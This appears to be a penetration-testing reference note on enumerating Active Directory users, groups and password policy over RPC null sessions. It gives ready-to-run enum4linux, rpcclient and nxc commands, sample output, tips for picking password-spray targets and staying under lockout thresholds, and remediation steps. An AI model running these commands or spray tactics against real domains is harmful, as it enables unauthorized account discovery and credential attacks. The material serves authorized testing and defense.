# Domain Account Discovery via RPC (Null Session)

**MITRE:** [T1087.002 - Account Discovery: Domain Account](https://attack.mitre.org/techniques/T1087/002/)  
**Phase:** Reconnaissance  
**Auth Required:** No (null session) or Low-priv  
**Tags:** #recon #account-discovery #rpc #null-session #unauthenticated #windows

---

## Summary
Using a null session or low-privilege credentials, enumerate domain users, groups, and password policy via RPC. The resulting user list feeds into password spraying, AS-REP roasting, targeted phishing, and privilege escalation path planning.

Tactic: **Discovery**
Technique: **Null Session** (the mechanism) → yields **Account Discovery** (the output)

## Mechanism
- **Protocol:** SMB (445/TCP) → IPC$ → RPC calls
- **Key RPC calls:** `enumdomusers`, `enumdomgroups`, `getdompwinfo`
- **RID cycling:** Even when direct enumeration blocked, iterate SIDs (S-1-5-21-[domain]-[RID]) to resolve usernames

## Commands
```bash
# Full account/group/policy sweep via null session
enum4linux -U -G -P -R <DC_IP>

# User list only
enum4linux -U <DC_IP>

# Password policy only
enum4linux -P <DC_IP>

# RID cycling (brute-force user discovery when enum blocked)
enum4linux -R <DC_IP>

# Direct RPC user enumeration
rpcclient -U "" -N <DC_IP> -c "enumdomusers"
rpcclient -U "" -N <DC_IP> -c "getdompwinfo"

# nxc fallback (handles modern targets better)
nxc smb <DC_IP> -u '' -p '' --users
nxc smb <DC_IP> -u '' -p '' --pass-pol
```

## Expected Output
```bash
# User list
[+] Enumerating users using SID S-1-5-21-...
user:[administrator] rid:[0x1f4]
user:[krbtgt] rid:[0x1f6]
user:[svc_backup] rid:[0x450]      ← service accounts are high-value targets
user:[jsmith] rid:[0x451]

# Password policy
[+] Password Info for Domain: CORP
    Minimum password length: 8
    Password history length: 24
    Maximum password age: 90 days
    Password Complexity: Enabled
    Lockout Threshold: 0            ← no lockout = unlimited spraying
    Lockout Duration: 30 mins
```

## What to Look For

| Finding | Significance |
|---------|-------------|
| Service accounts (`svc_*`, `_svc`, `-sa`) | High-value spray/roast targets |
| Lockout Threshold = 0 | No lockout — spray without restraint; separate finding |
| Lockout Threshold > 0 | Spray at threshold-1 attempts per window |
| Short min password length (< 12) | Weak policy finding |
| User list obtained | Feeds spray, phishing, AS-REP roasting wordlists |

## RID Cycling Detail
Every domain account has a SID: `S-1-5-21-[domain]-[RID]`
- 500 = Administrator
- 501 = Guest
- 502 = krbtgt
- 1000+ = created accounts

enum4linux `-R` iterates these and resolves each to a username — works even when `enumdomusers` is restricted.

## Notes
- Password policy lockout threshold is critical intel before any spray attempt
- Service accounts often have weaker passwords and don't expire — prioritize in spray lists
- User list + no lockout = AS-REP roasting opportunity (check for accounts with pre-auth disabled)

## Remediation
- Set `RestrictAnonymous = 2` and `RestrictAnonymousSAM = 1` (see [[null-session-enumeration]])
- Enable account lockout policy (threshold 3-5, duration 15-30 min)
- Audit service accounts — enforce strong passwords, consider gMSA
- Enable fine-grained password policies for privileged accounts

## Related
- [[null-session-enumeration]] — prerequisite technique
- [[tools/enum4linux]]
- [[tools/nxc]]
- [[dc-discovery-dns]] — DC targets for this technique
